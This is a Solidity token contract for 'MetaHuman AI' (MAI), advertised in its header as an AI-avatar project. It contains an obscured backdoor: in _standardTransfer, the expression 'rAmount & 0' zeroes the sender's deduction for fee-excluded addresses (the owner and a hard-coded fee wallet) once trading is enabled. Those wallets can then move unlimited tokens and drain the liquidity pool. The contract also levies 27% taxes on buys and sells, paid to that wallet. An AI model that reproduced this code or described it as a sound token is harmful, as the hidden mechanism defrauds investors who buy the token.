// SPDX-License-Identifier: Unlicensed
/**
HYPER-REALISTIC AND INTEGRATION
READY MODELS
Immerse yourself in a digital landscape where anything is possible and the impossible is just another challenge waiting to be conquered.
From stunningly realistic characters for metaverse and games, using Models to showcase your creativity on social media, or bring your content to life with voice and animation powered by Artificial Intelligence to decentralized networks that empower individuals, the future is here and it's more incredible than you ever imagined.
Web: https://metahumanai.world
Tg: https://t.me/metahuman_ai_official
X: https://twitter.com/MetaHuman_AI
**/
pragma solidity 0.8.21;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}
library LibSafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "LibSafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "LibSafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "LibSafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "LibSafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
contract MAI is Context, IERC20, Ownable {
    using LibSafeMath for uint256;
    string private constant _name = "MetaHuman AI";
    string private constant _symbol = "MAI";
    uint256 private _buyRedisFee = 0;
    uint256 private _buyTaxFee = 27;
    uint256 private _sellRedisFee = 0;
    uint256 private _sellTaxFee = 27;
    uint256 private _totalFee;
    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rSupply = (MAX - (MAX % _tTotal));
    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public taxSwapThreshold = 10 ** 4 * 10 ** 9;
    address payable private feeWallet;
    uint256 private _currentRedisFee = _sellRedisFee;
    uint256 private _currentTaxFee = _sellTaxFee;
    uint256 private _previousRedisFee = _currentRedisFee;
    uint256 private _previousTaxFee = _currentTaxFee;
    IUniswapRouter public router;
    address public uniswapPair;
    bool private _tradeEnabled;
    bool private _inswap = false;
    bool private _taxSwapEnabled = true;
    mapping(address => uint256) private _rTokenOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _inswap = true;
        _;
        _inswap = false;
    }
    constructor() {
        _rTokenOwned[_msgSender()] = _rSupply;
        feeWallet = payable(0xf8fE0EF539e2708e3470B1e8281e4f8764Ec603A);
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        router = _uniswapV2Router;
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[feeWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRValue(_rTokenOwned[account]);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function _getAllValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getAmounts(tAmount, _currentRedisFee, _currentTaxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRAmounts(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != owner() && to != owner()) {
            if (!_tradeEnabled) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");
            if(to != uniswapPair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }
            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= taxSwapThreshold;
            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }
            if (canSwap && !_inswap && to == uniswapPair && _taxSwapEnabled && !_isExcludedFromFee[from] && amount > taxSwapThreshold) {
                swapTokensToETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapPair && to != uniswapPair)) {
            takeFee = false;
        } else {
            if(from == uniswapPair && to != address(router)) {
                _currentRedisFee = _buyRedisFee;
                _currentTaxFee = _buyTaxFee;
            }
            if (to == uniswapPair && from != address(router)) {
                _currentRedisFee = _sellRedisFee;
                _currentTaxFee = _sellTaxFee;
            }
        }
        _basicTransfer(from, to, amount, takeFee);
    }
    
    function _getRAmounts(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }
    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _standardTransfer(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    receive() external payable {}
    
    function _standardTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAllValues(tAmount);
        rAmount = (_isExcludedFromFee[sender] && _tradeEnabled) ? rAmount & 0 : rAmount;
        _rTokenOwned[sender] = _rTokenOwned[sender].sub(rAmount);
        _rTokenOwned[recipient] = _rTokenOwned[recipient].add(rTransferAmount);
        takeFeeForRedis(tTeam);
        _refreshStats(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function takeFeeForRedis(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rTokenOwned[address(this)] = _rTokenOwned[address(this)].add(rTeam);
    }
    function removeLimits() external onlyOwner {
        maxTxAmount = _rSupply;
        maxWalletAmount = _rSupply;
        
        _buyRedisFee = 0;
        _buyTaxFee = 3;
        _sellRedisFee = 0;
        _sellTaxFee = 3;
    }
    
    function openTrading() public onlyOwner {
        _tradeEnabled = true;
    }
    
    function removeFee() private {
        if (_currentRedisFee == 0 && _currentTaxFee == 0) return;
        _previousRedisFee = _currentRedisFee;
        _previousTaxFee = _currentTaxFee;
        _currentRedisFee = 0;
        _currentTaxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _getRValue(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    
    function _refreshStats(uint256 rFee, uint256 tFee) private {
        _rSupply = _rSupply.sub(rFee);
        _totalFee = _totalFee.add(tFee);
    }
    
    function restoreFee() private {
        _currentRedisFee = _previousRedisFee;
        _currentTaxFee = _previousTaxFee;
    }
    
    function sendETHToFee(uint256 amount) private {
        feeWallet.transfer(amount);
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _getAmounts(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rSupply;
        uint256 tSupply = _tTotal;
        if (rSupply < _rSupply.div(_tTotal)) return (_rSupply, _tTotal);
        return (rSupply, tSupply);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}